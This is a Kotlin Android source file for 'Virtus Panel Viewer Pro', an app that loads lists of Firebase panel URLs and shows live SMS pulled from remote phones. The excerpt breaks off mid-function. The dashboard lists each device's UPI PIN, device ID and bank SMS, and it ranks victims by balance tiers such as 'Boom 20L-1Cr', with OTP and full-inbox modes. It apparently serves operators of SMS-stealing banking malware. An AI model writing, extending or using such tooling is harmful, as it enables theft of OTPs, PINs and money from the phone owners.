package com.firebasepanel.sms

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.AccountBalance
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.FlashOn
import androidx.compose.material.icons.filled.FolderOpen
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.Phone
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Search
import androidx.compose.material.icons.filled.Smartphone
import androidx.compose.material.icons.filled.ThumbUp
import androidx.compose.material.icons.filled.UploadFile
import androidx.compose.material.icons.outlined.DeleteOutline
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.ModalBottomSheet
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Text
import androidx.compose.material3.rememberModalBottomSheetState
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.firebasepanel.sms.domain.BalanceTier
import com.firebasepanel.sms.domain.ConnectionFilter
import com.firebasepanel.sms.domain.FilterConfig
import com.firebasepanel.sms.domain.InboxMode
import com.firebasepanel.sms.domain.PinFilter
import com.firebasepanel.sms.domain.SortMode
import com.firebasepanel.sms.ui.DeviceDetail
import com.firebasepanel.sms.ui.DeviceRow
import com.firebasepanel.sms.ui.FirebasePanelTheme
import com.firebasepanel.sms.ui.LiveSmsRow
import com.firebasepanel.sms.ui.PanelViewModel
import com.firebasepanel.sms.ui.SmsRow
import com.firebasepanel.sms.R
import com.firebasepanel.sms.ui.VirtusColors
import java.text.NumberFormat
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : ComponentActivity() {
    private val vm: PanelViewModel by viewModels()

    private val pickTxt =
        registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
            if (uri != null) {
                vm.loadUrlsFromTxt(this, uri)
            }
        }

    @OptIn(ExperimentalMaterial3Api::class)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            FirebasePanelTheme {
                val state by vm.state.collectAsState()
                val sheetState = rememberModalBottomSheetState(skipPartiallyExpanded = true)

                Box(
                    modifier =
                        Modifier
                            .fillMaxSize()
                            .background(VirtusColors.bg),
                ) {
                    LazyColumn(
                        modifier =
                            Modifier
                                .fillMaxSize()
                                .padding(horizontal = 14.dp, vertical = 10.dp),
                    ) {
                        item {
                            VirtusHeader()
                            Spacer(Modifier.height(10.dp))
                            TopActionRow(
                                onTxt = { pickTxt.launch(arrayOf("text/*", "application/octet-stream")) },
                                onFetchLive = {
                                    vm.setAutoLiveRefresh(true)
                                    vm.refreshNow()
                                },
                                onExport = { vm.exportDeviceListTxt() },
                                panels = state.urlsLoaded,
                                fetchEnabled = !state.fetching && state.urlsLoaded > 0,
                                exportEnabled = state.devices.isNotEmpty(),
                            )
                            Spacer(Modifier.height(12.dp))
                            DashboardMetrics(state = state)
                            Spacer(Modifier.height(12.dp))
                            SearchBarWithConnection(
                                query = state.searchQuery,
                                onQueryChange = { vm.setSearchQuery(it) },
                                connection = state.config.connection,
                                onConnectionToggle = {
                                    vm.updateConfig { c ->
                                        val next =
                                            when (c.connection) {
                                                ConnectionFilter.ONLINE -> ConnectionFilter.OFFLINE
                                                ConnectionFilter.OFFLINE -> ConnectionFilter.BOTH
                                                ConnectionFilter.BOTH -> ConnectionFilter.ONLINE
                                            }
                                        c.copy(connection = next)
                                    }
                                },
                            )
                            Spacer(Modifier.height(10.dp))
                            FilterDashboard(vm = vm, cfg = state.config)
                            Spacer(Modifier.height(10.dp))
                            ActiveStrip(cfg = state.config)
                            Spacer(Modifier.height(10.dp))
                            StartFetchButton(
                                busy = state.fetching,
                                enabled = !state.fetching && state.urlsLoaded > 0,
                                onClick = { vm.refreshNow() },
                            )
                        }
                        if (state.fetching) {
                            item {
                                Row(
                                    Modifier
                                        .fillMaxWidth()
                                        .padding(top = 8.dp),
                                    verticalAlignment = Alignment.CenterVertically,
                                ) {
                                    CircularProgressIndicator(
                                        modifier = Modifier.size(22.dp),
                                        color = VirtusColors.orange,
                                        strokeWidth = 2.dp,
                                    )
                                    Spacer(Modifier.width(10.dp))
                                    Text(
                                        state.progress.ifEmpty { "Fetching…" },
                                        color = VirtusColors.yellow,
                                        fontSize = 13.sp,
                                    )
                                }
                            }
                        }
                        state.error?.let { err ->
                            item {
                                Text(
                                    err,
                                    color = MaterialTheme.colorScheme.error,
                                    fontSize = 12.sp,
                                    modifier = Modifier.padding(top = 6.dp),
                                )
                            }
                        }
                        if (!state.fetching && state.lastFetchEpochMs > 0L) {
                            item {
                                Text(
                                    "Last sync: ${formatTsLong(state.lastFetchEpochMs)}",
                                    color = VirtusColors.onMuted,
                                    fontSize = 11.sp,
                                    modifier = Modifier.padding(top = 4.dp),
                                )
                            }
                        }
                        item {
                            Spacer(Modifier.height(8.dp))
                            Text(
                                "TXT upload → Fetch Live",
                                color = VirtusColors.yellow.copy(alpha = 0.85f),
                                fontSize = 11.sp,
                                modifier = Modifier.fillMaxWidth(),
                                textAlign = TextAlign.Center,
                            )
                            Spacer(Modifier.height(6.dp))
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                verticalAlignment = Alignment.CenterVertically,
                            ) {
                                Text(
                                    "Live SMS",
                                    color = VirtusColors.green,
                                    fontWeight = FontWeight.Bold,
                                    fontSize = 14.sp,
                                )
                                Spacer(Modifier.weight(1f))
                                Icon(
                                    Icons.Filled.AccountBalance,
                                    contentDescription = null,
                                    tint = VirtusColors.blue,
                                    modifier = Modifier.size(22.dp),
                                )
                            }
                        }
                        if (state.liveFeedSms.isEmpty()) {
                            item {
                                Text(
                                    "Fetch ke baad yahan recent SMS dikhenge",
                                    color = VirtusColors.onMuted,
                                    fontSize = 12.sp,
                                    modifier = Modifier.padding(vertical = 8.dp),
                                )
                            }
                        } else {
                            items(state.liveFeedSms) { row ->
                                LiveSmsCardYellow(row)
                            }
                        }
                        item {
                            Column(Modifier.fillMaxWidth()) {
                                HorizontalDivider(
                                    color = VirtusColors.onMuted.copy(alpha = 0.25f),
                                    modifier = Modifier.padding(vertical = 8.dp),
                                )
                                Text(
                                    "Devices (${state.devices.size})",
                                    color = MaterialTheme.colorScheme.onBackground,
                                    fontWeight = FontWeight.SemiBold,
                                    fontSize = 14.sp,
                                )
                                Spacer(Modifier.height(6.dp))
                            }
                        }
                        items(state.devices.withIndex().toList()) { (index, row) ->
                            DeviceCardYellow(
                                index = index + 1,
                                row = row,
                                onInfoClick = { vm.selectDevice(row) },
                            )
                        }
                    }
                }

                state.selected?.let { d ->
                    ModalBottomSheet(
                        onDismissRequest = { vm.clearSelection() },
                        sheetState = sheetState,
                        containerColor = VirtusColors.card,
                    ) {
                        DeviceDetailSheet(d, onDismiss = { vm.clearSelection() }) {
                            Column(
                                modifier =
                                    Modifier
                                        .fillMaxWidth()
                                        .heightIn(max = 400.dp)
                                        .verticalScroll(rememberScrollState()),
                            ) {
                                d.messages.forEach { m -> SmsCardYellow(m) }
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
private fun VirtusHeader() {
    Row(verticalAlignment = Alignment.CenterVertically) {
        Image(
            painter = painterResource(id = R.drawable.virtus_gt_sms_logo),
            contentDescription = null,
            modifier =
                Modifier
                    .size(48.dp)
                    .clip(RoundedCornerShape(10.dp)),
            contentScale = ContentScale.Crop,
        )
        Spacer(Modifier.width(12.dp))
        Column {
            Text(
                "Virtus Panel Viewer Pro",
                color = MaterialTheme.colorScheme.onBackground,
                fontWeight = FontWeight.Bold,
                fontSize = 18.sp,
            )
            Text(
                "Firebase + live SMS",
                color = VirtusColors.onMuted,
                fontSize = 12.sp,
            )
        }
    }
}

@Composable
private fun TopActionRow(
    onTxt: () -> Unit,
    onFetchLive: () -> Unit,
    onExport: () -> Unit,
    panels: Int,
    fetchEnabled: Boolean,
    exportEnabled: Boolean,
) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.spacedBy(8.dp),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        VirtusSmallButton(
            onClick = onTxt,
            container = VirtusColors.card,
            content = VirtusColors.yellow,
            icon = { Icon(Icons.Filled.FolderOpen, null) },
            label = "TXT",
        )
        Button(
            onClick = onFetchLive,
            enabled = fetchEnabled,
            modifier = Modifier.weight(1f),
            shape = RoundedCornerShape(14.dp),
            colors =
                ButtonDefaults.buttonColors(
                    containerColor = VirtusColors.orange,
                    contentColor = Color.White,
                    disabledContainerColor = VirtusColors.card,
                    disabledContentColor = VirtusColors.onMuted,
                ),
        ) {
            Icon(Icons.Filled.FlashOn, contentDescription = null, modifier = Modifier.size(18.dp))
            Spacer(Modifier.width(6.dp))
            Text("Fetch Live", fontWeight = FontWeight.Bold)
        }
        OutlinedButton(
            onClick = onExport,
            enabled = exportEnabled,
            modifier = Modifier.height(44.dp),
            shape = RoundedCornerShape(14.dp),
            border = BorderStroke(1.dp, VirtusColors.yellow),
            colors =
                ButtonDefaults.outlinedButtonColors(
                    containerColor = VirtusColors.card,
                    contentColor = VirtusColors.yellow,
                    disabledContentColor = VirtusColors.onMuted,
                ),
            contentPadding = PaddingValues(horizontal = 10.dp, vertical = 8.dp),
        ) {
            Icon(Icons.Filled.UploadFile, contentDescription = null, modifier = Modifier.size(16.dp))
            Spacer(Modifier.width(4.dp))
            Text("Export TXT", fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
        }
        Text(
            "$panels panels",
            color = VirtusColors.onMuted,
            fontSize = 11.sp,
            modifier = Modifier.padding(start = 2.dp),
        )
    }
}

@Composable
private fun VirtusSmallButton(
    onClick: () -> Unit,
    container: Color,
    content: Color,
    label: String,
    icon: @Composable () -> Unit,
    enabled: Boolean = true,
) {
    Button(
        onClick = onClick,
        enabled = enabled,
        modifier = Modifier.height(44.dp),
        shape = RoundedCornerShape(14.dp),
        colors =
            ButtonDefaults.buttonColors(
                containerColor = container,
                contentColor = content,
                disabledContainerColor = VirtusColors.card,
                disabledContentColor = VirtusColors.onMuted,
            ),
        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 8.dp),
    ) {
        icon()
        Spacer(Modifier.width(4.dp))
        Text(label, fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
    }
}

@Composable
private fun DashboardMetrics(state: com.firebasepanel.sms.ui.UiState) {
    val devices = state.devices
    val totalDev = devices.size
    val onlineDev = devices.count { it.online }
    val maxBal = devices.maxOfOrNull { it.maxBalance } ?: 0.0
    val totalSms = devices.sumOf { it.smsCount }
    val nf = NumberFormat.getNumberInstance(Locale.US)
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.spacedBy(8.dp),
    ) {
        MetricCard("DEVICES", totalDev.toString(), VirtusColors.orange, Modifier.weight(1f))
        MetricCard("ONLINE", onlineDev.toString(), VirtusColors.green, Modifier.weight(1f))
        MetricCard(
            "BALANCE",
            if (maxBal > 0) "₹${nf.format(maxBal.toLong())}" else "—",
            VirtusColors.yellow,
            Modifier.weight(1f),
        )
    }
    Spacer(Modifier.height(8.dp))
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.spacedBy(8.dp),
    ) {
        MetricCard("BANK SMS", totalSms.toString(), VirtusColors.blue, Modifier.weight(1f))
        MetricCard("PANELS", state.urlsLoaded.toString(), VirtusColors.green, Modifier.weight(1f))
        Spacer(Modifier.weight(1f))
    }
}

@Composable
private fun MetricCard(
    title: String,
    value: String,
    valueColor: Color,
    modifier: Modifier = Modifier,
) {
    Card(
        modifier = modifier,
        shape = RoundedCornerShape(14.dp),
        colors = CardDefaults.cardColors(containerColor = VirtusColors.card),
        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp),
    ) {
        Column(Modifier.padding(horizontal = 10.dp, vertical = 10.dp)) {
            Text(title, color = VirtusColors.onMuted, fontSize = 10.sp, letterSpacing = 0.5.sp)
            Spacer(Modifier.height(4.dp))
            Text(
                value,
                color = valueColor,
                fontWeight = FontWeight.Bold,
                fontSize = 16.sp,
                maxLines = 1,
                overflow = TextOverflow.Ellipsis,
            )
        }
    }
}

@Composable
private fun SearchBarWithConnection(
    query: String,
    onQueryChange: (String) -> Unit,
    connection: ConnectionFilter,
    onConnectionToggle: () -> Unit,
) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        verticalAlignment = Alignment.CenterVertically,
        horizontalArrangement = Arrangement.spacedBy(8.dp),
    ) {
        OutlinedTextField(
            value = query,
            onValueChange = onQueryChange,
            modifier = Modifier.weight(1f),
            placeholder = { Text("Search Here", color = VirtusColors.onMuted) },
            leadingIcon = {
                Icon(Icons.Filled.Search, contentDescription = null, tint = VirtusColors.onMuted)
            },
            singleLine = true,
            shape = RoundedCornerShape(16.dp),
            colors =
                OutlinedTextFieldDefaults.colors(
                    focusedContainerColor = VirtusColors.card,
                    unfocusedContainerColor = VirtusColors.card,
                    focusedBorderColor = VirtusColors.orange.copy(alpha = 0.8f),
                    unfocusedBorderColor = VirtusColors.onMuted.copy(alpha = 0.35f),
                    focusedTextColor = MaterialTheme.colorScheme.onBackground,
                    unfocusedTextColor = MaterialTheme.colorScheme.onBackground,
                    cursorColor = VirtusColors.yellow,
                ),
        )
        val connLabel =
            when (connection) {
                ConnectionFilter.ONLINE -> "Online"
                ConnectionFilter.OFFLINE -> "Offline"
                ConnectionFilter.BOTH -> "Both"
            }
        val connEmoji =
            when (connection) {
                ConnectionFilter.ONLINE -> "🟢"
                ConnectionFilter.OFFLINE -> "⚫"
                ConnectionFilter.BOTH -> "🔁"
            }
        Row(
            modifier =
                Modifier
                    .clip(RoundedCornerShape(16.dp))
                    .background(VirtusColors.card)
                    .border(1.dp, VirtusColors.onMuted.copy(alpha = 0.3f), RoundedCornerShape(16.dp))
                    .clickable(onClick = onConnectionToggle)
                    .padding(horizontal = 12.dp, vertical = 14.dp),
            verticalAlignment = Alignment.CenterVertically,
        ) {
            Text(connEmoji, fontSize = 12.sp)
            Spacer(Modifier.width(4.dp))
            Text(
                connLabel,
                color = VirtusColors.green,
                fontWeight = FontWeight.SemiBold,
                fontSize = 12.sp,
            )
        }
    }
}

@Composable
private fun FilterDashboard(
    vm: PanelViewModel,
    cfg: FilterConfig,
) {
    val sectionLabel = VirtusColors.onMuted
    Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
        Text("Mode", color = sectionLabel, fontSize = 11.sp, fontWeight = FontWeight.Medium)
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(6.dp),
        ) {
            VirtusFilterPill(
                selected = cfg.inboxMode == InboxMode.BANK_FILTERED,
                label = "Bank+Band",
                emoji = "🏦",
                lightTheme = false,
                onClick = { vm.setInboxMode(InboxMode.BANK_FILTERED) },
            )
            VirtusFilterPill(
                selected = cfg.inboxMode == InboxMode.BANK_ALL,
                label = "All bank",
                emoji = "🏛",
                lightTheme = false,
                onClick = { vm.setInboxMode(InboxMode.BANK_ALL) },
            )
            VirtusFilterPill(
                selected = cfg.inboxMode == InboxMode.OTP_AND_ALERTS,
                label = "OTP",
                emoji = "📱",
                lightTheme = false,
                onClick = { vm.setInboxMode(InboxMode.OTP_AND_ALERTS) },
            )
            VirtusFilterPill(
                selected = cfg.inboxMode == InboxMode.FULL_INBOX,
                label = "Full",
                emoji = "📥",
                lightTheme = false,
                onClick = { vm.setInboxMode(InboxMode.FULL_INBOX) },
            )
        }
        if (cfg.inboxMode == InboxMode.BANK_FILTERED) {
            Text("Tier & sort", color = sectionLabel, fontSize = 11.sp, fontWeight = FontWeight.Medium)
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(6.dp),
            ) {
                VirtusFilterPill(
                    selected =
                        cfg.balanceTier == BalanceTier.HIGH_1L_20L &&
                            cfg.sortMode == SortMode.HIGH_TO_LOW,
                    label = "High 1L-20L",
                    emoji = "⬇",
                    lightTheme = false,
                    onClick = {
                        vm.updateConfig {
                            it.copy(
                                balanceTier = BalanceTier.HIGH_1L_20L,
                                sortMode = SortMode.HIGH_TO_LOW,
                            )
                        }
                    },
                )
                VirtusFilterPill(
                    selected =
                        cfg.balanceTier == BalanceTier.BOOM_20L_90L &&
                            cfg.sortMode == SortMode.HIGH_TO_LOW,
                    label = "Boom 20L-1Cr",
                    emoji = "💥",
                    lightTheme = false,
                    onClick = {
                        vm.updateConfig {
                            it.copy(
                                balanceTier = BalanceTier.BOOM_20L_90L,
                                sortMode = SortMode.HIGH_TO_LOW,
                            )
                        }
                    },
                )
                VirtusFilterPill(
                    selected =
                        cfg.balanceTier == BalanceTier.MEDIUM_5K_1L &&
                            cfg.sortMode == SortMode.HIGH_TO_LOW,
                    label = "Medium 5K",
                    emoji = "💛",
                    lightTheme = false,
                    onClick = {
                        vm.updateConfig {
                            it.copy(
                                balanceTier = BalanceTier.MEDIUM_5K_1L,
                                sortMode = SortMode.HIGH_TO_LOW,
                            )
                        }
                    },
                )
                VirtusFilterPill(
                    selected =
                        cfg.balanceTier == BalanceTier.LOW_2K_50K &&
                            cfg.sortMode == SortMode.LOW_TO_HIGH,
                    label = "Low → High",
                    emoji = "⬆",
                    lightTheme = false,
                    onClick = {
                        vm.updateConfig {
                            it.copy(
                                balanceTier = BalanceTier.LOW_2K_50K,
                                sortMode = SortMode.LOW_TO_HIGH,
                            )
                        }
                    },
                )
            }
        }
        if (cfg.inboxMode == InboxMode.BANK_ALL) {
            Text("Balance band (all bank SMS)", color = sectionLabel, fontSize = 11.sp, fontWeight = FontWeight.Medium)
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(6.dp),
            ) {
                VirtusFilterPill(
                    selected = cfg.sortMode == SortMode.HIGH_TO_LOW,
                    label = "High 50K–90L",
                    emoji = "⬇",
                    lightTheme = false,
                    onClick = { vm.updateConfig { it.copy(sortMode = SortMode.HIGH_TO_LOW) } },
                )
                VirtusFilterPill(
                    selected = cfg.sortMode == SortMode.LOW_TO_HIGH,
                    label = "Low→High 2K–50K",
                    emoji = "⬆",
                    lightTheme = false,
                    onClick = { vm.updateConfig { it.copy(sortMode = SortMode.LOW_TO_HIGH) } },
                )
            }
        }
        if (cfg.inboxMode == InboxMode.BANK_FILTERED || cfg.inboxMode == InboxMode.BANK_ALL) {
            Text("Sort list by", color = sectionLabel, fontSize = 11.sp, fontWeight = FontWeight.Medium)
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(6.dp),
            ) {
                VirtusFilterPill(
                    selected = !cfg.sortByBattery,
                    label = "₹ Balance",
                    emoji = "💰",
                    lightTheme = false,
                    onClick = { vm.updateConfig { it.copy(sortByBattery = false) } },
                )
                VirtusFilterPill(
                    selected = cfg.sortByBattery,
                    label = "Battery %",
                    emoji = "🔋",
                    lightTheme = false,
                    onClick = { vm.updateConfig { it.copy(sortByBattery = true) } },
                )
            }
            Text("PIN (device)", color = sectionLabel, fontSize = 11.sp, fontWeight = FontWeight.Medium)
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(6.dp),
            ) {
                VirtusFilterPill(
                    selected = cfg.pinFilter == PinFilter.WITH,
                    label = "PIN",
                    emoji = "🔑",
                    lightTheme = false,
                    onClick = { vm.updateConfig { it.copy(pinFilter = PinFilter.WITH) } },
                )
                VirtusFilterPill(
                    selected = cfg.pinFilter == PinFilter.WITHOUT,
                    label = "No PIN",
                    emoji = "🚫",
                    lightTheme = false,
                    onClick = { vm.updateConfig { it.copy(pinFilter = PinFilter.WITHOUT) } },
                )
                VirtusFilterPill(
                    selected = cfg.pinFilter == PinFilter.BOTH,
                    label = "Both",
                    emoji = "➕",
                    lightTheme = false,
                    onClick = { vm.updateConfig { it.copy(pinFilter = PinFilter.BOTH) } },
                )
            }
        }
        Text("SMS age", color = sectionLabel, fontSize = 11.sp, fontWeight = FontWeight.Medium)
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(6.dp),
        ) {
            listOf(1, 3, 7, 15, 30).forEach { d ->
                VirtusFilterPill(
                    selected = cfg.days == d,
                    label = "${d}d",
                    emoji = "🕐",
                    compact = true,
                    lightTheme = false,
                    onClick = { vm.updateConfig { it.copy(days = d) } },
                )
            }
            VirtusFilterPill(
                selected = cfg.days == null,
                label = "All",
                emoji = "∞",
                compact = true,
                lightTheme = false,
                onClick = { vm.updateConfig { it.copy(days = null) } },
            )
        }
    }
}

@Composable
private fun VirtusFilterPill(
    selected: Boolean,
    label: String,
    emoji: String,
    onClick: () -> Unit,
    compact: Boolean = false,
    lightTheme: Boolean = false,
) {
    val bg =
        when {
            selected && lightTheme -> VirtusColors.orange.copy(alpha = 0.45f)
            selected && !lightTheme -> VirtusColors.orange.copy(alpha = 0.22f)
            lightTheme -> Color.White.copy(alpha = 0.92f)
            else -> VirtusColors.card
        }
    val border =
        when {
            selected && lightTheme -> VirtusColors.labelBlue
            selected && !lightTheme -> VirtusColors.yellow
            lightTheme -> Color(0xFFCCCCCC)
            else -> VirtusColors.onMuted.copy(alpha = 0.25f)
        }
    val textColor =
        when {
            selected && lightTheme -> Color(0xFF0D47A1)
            selected && !lightTheme -> VirtusColors.yellow
            lightTheme -> Color(0xFF212121)
            else -> MaterialTheme.colorScheme.onBackground.copy(alpha = 0.92f)
        }
    val padH = if (compact) 8.dp else 10.dp
    Row(
        modifier =
            Modifier
                .clip(RoundedCornerShape(20.dp))
                .background(bg)
                .border(1.dp, border, RoundedCornerShape(20.dp))
                .clickable(onClick = onClick)
                .padding(horizontal = padH, vertical = 8.dp),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        Text(emoji, fontSize = if (compact) 11.sp else 13.sp)
        Spacer(Modifier.width(4.dp))
        Text(
            label,
            color = textColor,
            fontSize = if (compact) 11.sp else 12.sp,
            fontWeight = if (selected) FontWeight.Bold else FontWeight.Normal,
            maxLines = 1,
            overflow = TextOverflow.Ellipsis,
        )
    }
}

@Composable
private fun ActiveStrip(cfg: FilterConfig) {
    val parts = mutableListOf<String>()
    parts.add(
        when (cfg.inboxMode) {
            InboxMode.BANK_FILTERED -> "Bank+Band"
            InboxMode.BANK_ALL -> "All bank"
            InboxMode.OTP_AND_ALERTS -> "OTP/Alerts"
            InboxMode.FULL_INBOX -> "Full inbox"
        },
    )
    if (cfg.inboxMode == InboxMode.BANK_FILTERED) {
        parts.add(
            when (cfg.balanceTier) {
                BalanceTier.HIGH_1L_20L -> if (cfg.sortMode == SortMode.HIGH_TO_LOW) "↓ High 1L-20L" else "High tier"
                BalanceTier.BOOM_20L_90L -> if (cfg.sortMode == SortMode.HIGH_TO_LOW) "💥 Boom 20L-90L" else "Boom"
                BalanceTier.MEDIUM_5K_1L -> "💛 Medium 5K"
                BalanceTier.LOW_2K_50K -> "↑ Low→High"
            },
        )
    }
    if (cfg.inboxMode == InboxMode.BANK_FILTERED || cfg.inboxMode == InboxMode.BANK_ALL) {
        parts.add(
            when (cfg.sortMode) {
                SortMode.HIGH_TO_LOW -> "High→Low"
                SortMode.LOW_TO_HIGH -> "Low→High"
            },
        )
        parts.add(if (cfg.sortByBattery) "Sort:Bat" else "Sort:₹")
        parts.add(
            when (cfg.pinFilter) {
                PinFilter.WITH -> "PIN"
                PinFilter.WITHOUT -> "No PIN"
                PinFilter.BOTH -> "PIN both"
            },
        )
    }
    parts.add(
        when (cfg.connection) {
            ConnectionFilter.ONLINE -> "🟢 Online"
            ConnectionFilter.OFFLINE -> "⚫ Offline"
            ConnectionFilter.BOTH -> "Both conn"
        },
    )
    parts.add(
        when (cfg.days) {
            null -> "All time"
            else -> "${cfg.days}d"
        },
    )
    Row(
        modifier =
            Modifier
                .fillMaxWidth()
                .clip(RoundedCornerShape(14.dp))
                .background(VirtusColors.card)
                .border(1.dp, VirtusColors.onMuted.copy(alpha = 0.25f), RoundedCornerShape(14.dp))
                .padding(horizontal = 12.dp, vertical = 10.dp),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        Text("ACTIVE", color = VirtusColors.green, fontWeight = FontWeight.Bold, fontSize = 11.sp)
        Spacer(Modifier.width(10.dp))
        Row(
            horizontalArrangement = Arrangement.spacedBy(6.dp),
            modifier = Modifier.weight(1f),
        ) {
            parts.forEach { p ->
                Box(
                    modifier =
                        Modifier
                            .clip(RoundedCornerShape(12.dp))
                            .background(VirtusColors.orange.copy(alpha = 0.28f))
                            .padding(horizontal = 8.dp, vertical = 4.dp),
                ) {
                    Text(p, color = VirtusColors.yellow, fontSize = 10.sp, maxLines = 1, overflow = TextOverflow.Ellipsis)
                }
            }
        }
    }
}

@Composable
private fun StartFetchButton(
    busy: Boolean,
    enabled: Boolean,
    onClick: () -> Unit,
) {
    Button(
        onClick = onClick,
        enabled = enabled && !busy,
        modifier =
            Modifier
                .fillMaxWidth()
                .height(52.dp),
        shape = RoundedCornerShape(16.dp),
        colors =
            ButtonDefaults.buttonColors(
                containerColor = VirtusColors.green,
                contentColor = Color(0xFF052E16),
                disabledContainerColor = VirtusColors.card,
                disabledContentColor = VirtusColors.onMuted,
            ),
    ) {
        if (busy) {
            CircularProgressIndicator(
                modifier = Modifier.size(22.dp),
                color = Color(0xFF052E16),
                strokeWidth = 2.dp,
            )
            Spacer(Modifier.width(10.dp))
            Text("Fetching…", fontWeight = FontWeight.Bold)
        } else {
            Icon(Icons.Filled.PlayArrow, contentDescription = null)
            Spacer(Modifier.width(8.dp))
            Text("Start Fetch", fontWeight = FontWeight.Bold, fontSize = 16.sp)
        }
    }
}

@Composable
private fun DeviceCardYellow(
    index: Int,
    row: DeviceRow,
    onInfoClick: () -> Unit,
) {
    Card(
        modifier =
            Modifier
                .fillMaxWidth()
                .padding(vertical = 6.dp),
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.cardColors(containerColor = VirtusColors.smsCardWhite),
        elevation = CardDefaults.cardElevation(defaultElevation = 4.dp),
    ) {
        Row(
            Modifier.padding(12.dp),
            verticalAlignment = Alignment.Top,
        ) {
            Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.width(36.dp)) {
                Text(
                    "$index",
                    color = VirtusColors.labelBlue,
                    fontWeight = FontWeight.Bold,
                    fontSize = 18.sp,
                )
                Icon(
                    Icons.Filled.Smartphone,
                    contentDescription = null,
                    tint = VirtusColors.labelBlue,
                    modifier = Modifier.size(28.dp),
                )
            }
            Spacer(Modifier.width(10.dp))
            Column(Modifier.weight(1f)) {
                DetailLine("Mobile", row.modelDisplay)
                DetailLine("UPI Pin", row.upiPinDisplay)
                DetailLine("Device Id", row.deviceId)
                DetailLine("Battery", if (row.batteryPercent != null) "${row.batteryPercent}%" else "—")
                DetailLine(
                    "Date",
                    if (row.lastSeenMillis != null && row.lastSeenMillis!! > 0L) formatTsLong(row.lastSeenMillis!!) else "—",
                )
                HorizontalDivider(Modifier.padding(vertical = 6.dp), color = Color(0xFFE0E0E0))
                Text(
                    "Status: ${if (row.online) "Online" else "Offline"}",
                    color = if (row.online) Color(0xFF2E7D32) else Color(0xFFC62828),
                    fontWeight = FontWeight.SemiBold,
                    fontSize = 13.sp,
                )
                Text(
                    "₹ ${formatInr(row.maxBalance)} · ${row.smsCount} SMS",
                    color = Color(0xFF424242),
                    fontSize = 11.sp,
                    modifier = Modifier.padding(top = 4.dp),
                )
            }
            Column(
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.spacedBy(4.dp),
                modifier = Modifier.padding(start = 6.dp),
            ) {
                IconButton(
                    onClick = { /* Approve — panel-only UI */ },
                    modifier = Modifier.size(40.dp),
                ) {
                    Icon(Icons.Filled.ThumbUp, contentDescription = "Approve", tint = Color(0xFF2E7D32), modifier = Modifier.size(22.dp))
                }
                IconButton(onClick = onInfoClick, modifier = Modifier.size(40.dp)) {
